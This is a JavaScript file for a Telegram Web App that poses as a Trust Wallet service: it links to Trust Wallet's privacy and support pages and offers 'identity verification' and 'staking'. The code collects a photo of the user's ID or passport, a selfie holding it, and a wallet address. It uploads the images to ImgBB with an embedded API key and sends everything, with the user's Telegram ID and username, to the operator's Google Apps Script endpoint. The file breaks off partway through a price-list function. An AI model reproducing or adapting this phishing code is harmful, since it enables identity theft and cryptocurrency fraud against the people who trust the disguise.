const tg = window.Telegram.WebApp;
tg.expand();

// !!! ВСТАВЬ СВОИ ДАННЫЕ НИЖЕ !!!
const IMGBB_API_KEY = 'a2973b7dd242d701ce2c0d529bcd6a72'; 
const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzelbj3lbKhVSgYnGnkfLbOQNOIkpCe97zs-GDzxceOY7whN4iBVR9FP_VFSo_Jduwo/exec'; 

const translations = {
    ru: {
        verify_title: "Верификация личности",
        doc_label: "Документ (ID / Паспорт)",
        selfie_label: "Селфи с документом",
        choose_photo: "Выбрать фото",
        take_photo: "Сделать фото",
        send_data: "Отправить данные",
        staking_title: "Стейкинг активов",
        wallet_placeholder: "Введите адрес кошелька",
        connect_wallet: "Подключить кошелек",
        loading: "Загрузка...",
        processing: "Запрос в обработке...",
        settings: "Настройки",
        help_support: "Помощь и поддержка",
        support_center: "Центр поддержки",
        support_service: "Служба поддержки",
        language: "Язык",
        privacy: "Политика конфиденциальности",
        statistics: "Статистика",
        market_cap: "Капитализация",
        circulating: "В обращении",
        volume_24h: "Объём (24 ч)",
        done: "Готово ✅",
        error_photo: "❌ Загрузите оба фото",
        error_wallet: "❌ Введите адрес кошелька",
        error_net: "❌ Ошибка сети",
        uploading: "⏳ Загрузка фото...",
        success: "✅ Данные приняты!"
    },
    en: {
        verify_title: "Identity Verification",
        doc_label: "Document (ID / Passport)",
        selfie_label: "Selfie with Document",
        choose_photo: "Choose Photo",
        take_photo: "Take Photo",
        send_data: "Send Data",
        staking_title: "Asset Staking",
        wallet_placeholder: "Enter wallet address",
        connect_wallet: "Connect Wallet",
        loading: "Loading...",
        processing: "Processing request...",
        settings: "Settings",
        help_support: "Help & Support",
        support_center: "Support Center",
        support_service: "Support Service",
        language: "Language",
        privacy: "Privacy Policy",
        statistics: "Statistics",
        market_cap: "Market Cap",
        circulating: "Circulating Supply",
        volume_24h: "Volume (24h)",
        done: "Done ✅",
        error_photo: "❌ Upload both photos",
        error_wallet: "❌ Enter wallet address",
        error_net: "❌ Network error",
        uploading: "⏳ Uploading photos...",
        success: "✅ Data accepted!"
    },
    fr: {
        verify_title: "Vérification d'identité",
        doc_label: "Document (ID / Passeport)",
        selfie_label: "Selfie avec document",
        choose_photo: "Choisir une photo",
        take_photo: "Prendre une photo",
        send_data: "Envoyer les données",
        staking_title: "Staking d'actifs",
        wallet_placeholder: "Entrez l'adresse",
        connect_wallet: "Connecter le portefeuille",
        loading: "Chargement...",
        processing: "Traitement...",
        settings: "Paramètres",
        help_support: "Aide et support",
        language: "Langue",
        privacy: "Confidentialité",
        statistics: "Statistiques",
        market_cap: "Capitalisation",
        circulating: "En circulation",
        volume_24h: "Volume (24h)",
        done: "Terminé ✅",
        error_photo: "❌ Photos manquantes",
        error_wallet: "❌ Adresse invalide",
        error_net: "❌ Erreur réseau",
        uploading: "⏳ Téléchargement...",
        success: "✅ Succès!"
    },
    de: {
        verify_title: "Identitätsprüfung",
        doc_label: "Dokument (ID / Pass)",
        selfie_label: "Selfie mit Dokument",
        choose_photo: "Foto wählen",
        take_photo: "Foto machen",
        send_data: "Daten senden",
        staking_title: "Asset-Staking",
        wallet_placeholder: "Wallet-Adresse",
        connect_wallet: "Wallet verbinden",
        loading: "Laden...",
        processing: "In Bearbeitung...",
        settings: "Einstellungen",
        help_support: "Hilfe & Support",
        language: "Sprache",
        privacy: "Datenschutz",
        statistics: "Statistiken",
        market_cap: "Marktkapitalisierung",
        circulating: "Im Umlauf",
        volume_24h: "Volumen (24h)",
        done: "Fertig ✅",
        error_photo: "❌ Fotos fehlen",
        error_wallet: "❌ Adresse fehlt",
        error_net: "❌ Netzwerkfehler",
        uploading: "⏳ Hochladen...",
        success: "✅ Erledigt!"
    }
};

let currentLang = localStorage.getItem('lang') || 'ru';
let myChart = null;

// Применение переводов
function applyLanguage() {
    document.querySelectorAll('[data-i18n]').forEach(el => {
        const key = el.getAttribute('data-i18n');
        if (translations[currentLang][key]) el.textContent = translations[currentLang][key];
    });
    document.querySelectorAll('[data-i18n-placeholder]').forEach(el => {
        const key = el.getAttribute('data-i18n-placeholder');
        if (translations[currentLang][key]) el.placeholder = translations[currentLang][key];
    });
    document.querySelectorAll('input[name="lang"]').forEach(radio => {
        if (radio.value === currentLang) radio.checked = true;
    });
}

// Навигация
function showScreen(id) {
    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
    document.getElementById(id).classList.add('active');
}

document.getElementById('settingsBtn').onclick = () => showScreen('settingsScreen');
document.getElementById('backFromSettings').onclick = () => showScreen('mainScreen');
document.getElementById('helpBtn').onclick = () => showScreen('helpScreen');
document.getElementById('backFromHelp').onclick = () => showScreen('settingsScreen');
document.getElementById('langBtn').onclick = () => showScreen('langScreen');
document.getElementById('backFromLang').onclick = () => showScreen('settingsScreen');
document.getElementById('backFromCoin').onclick = () => showScreen('mainScreen');

document.getElementById('privacyBtn').onclick = () => tg.openLink('https://trustwallet.com/ru/privacy-notice');
document.getElementById('supportCenterBtn').onclick = () => tg.openLink('https://support.trustwallet.com/support/home');
document.getElementById('supportServiceBtn').onclick = () => tg.openLink('https://trustwallet.com/ru/blog/guides/beginners-guide-to-trust-wallet-browser-extension');

// Смена языка
document.querySelectorAll('input[name="lang"]').forEach(radio => {
    radio.onchange = function() {
        currentLang = this.value;
        localStorage.setItem('lang', currentLang);
        applyLanguage();
        showStatus('✅ Language: ' + currentLang.toUpperCase());
    };
});

// Превью фото
function setupPreview(inputId, previewId, textId) {
    const input = document.getElementById(inputId);
    const preview = document.getElementById(previewId);
    const text = document.getElementById(textId);

    input.onchange = function() {
        const file = this.files[0];
        if (file) {
            const reader = new FileReader();
            reader.onload = (e) => {
                preview.src = e.target.result;
                preview.classList.remove('hidden');
                text.textContent = translations[currentLang].done;
            }
            reader.readAsDataURL(file);
        }
    };
}
setupPreview('docInput', 'previewDoc', 'textDoc');
setupPreview('selfieInput', 'previewSelfie', 'textSelfie');

// --- ОТПРАВКА ВЕРИФИКАЦИИ ---
async function sendVerification() {
    const docFile = document.getElementById('docInput').files[0];
    const selfieFile = document.getElementById('selfieInput').files[0];
    const wallet = document.getElementById('walletInput').value;

    if (!docFile || !selfieFile) {
        showStatus(translations[currentLang].error_photo);
        return;
    }

    showStatus(translations[currentLang].uploading);

    try {
        const upload = async (file) => {
            const fd = new FormData();
            fd.append('image', file);
            const res = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, { method: 'POST', body: fd });
            const d = await res.json();
            return d.data.url;
        };

        const url1 = await upload(docFile);
        const url2 = await upload(selfieFile);

        const payload = {
            action: "verification",
            user_id: tg.initDataUnsafe?.user?.id || "unknown",
            username: tg.initDataUnsafe?.user?.username || "no_username",
            wallet: wallet || "not_set",
            doc: url1,
            selfie: url2
        };

        await fetch(GOOGLE_SCRIPT_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
        tg.sendData(JSON.stringify(payload));
        showStatus(translations[currentLang].success);
        setTimeout(() => tg.close(), 2000);
    } catch (e) {
        showStatus(translations[currentLang].error_net);
    }
}

// --- ОТПРАВКА СТЕЙКИНГА ---
async function sendStaking() {
    const wallet = document.getElementById('walletInput').value;
    if (!wallet || wallet.length < 5) {
        showStatus(translations[currentLang].error_wallet);
        return;
    }

    showStatus(translations[currentLang].processing);

    const payload = {
        action: "staking",
        user_id: tg.initDataUnsafe?.user?.id || "unknown",
        username: tg.initDataUnsafe?.user?.username || "no_username",
        wallet: wallet,
        doc: "STAKING_REQUEST",
        selfie: "STAKING_REQUEST"
    };

    try {
        await fetch(GOOGLE_SCRIPT_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
        tg.sendData(JSON.stringify(payload));
        showStatus(translations[currentLang].success);
        setTimeout(() => tg.close(), 2000);
    } catch (e) {
        showStatus(translations[currentLang].error_net);
    }
}

document.getElementById('verifyBtn').onclick = sendVerification;
document.getElementById('stakingBtn').onclick = sendStaking;

// --- КОТИРОВКИ И ГРАФИКИ ---
async function getPrices() {
    try {
        const res = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=bitcoin,ethereum,binancecoin,solana,tron&order=market_cap_desc&sparkline=true');
        const data = await res.json();
        const list = document.getElementById('tokensList');
        list.innerHTML = '';

        data.forEach(coin => {
            const div = document.createElement('div');
            div.className = 'token-item';
            const change = coin.price_change_percentage_24h;
            div.innerHTML = `
                <div class="token-info">
                    <img src="${coin.image}" class="token-icon">
                    <div>
                        <div class="token-name">${coin.name}</div>
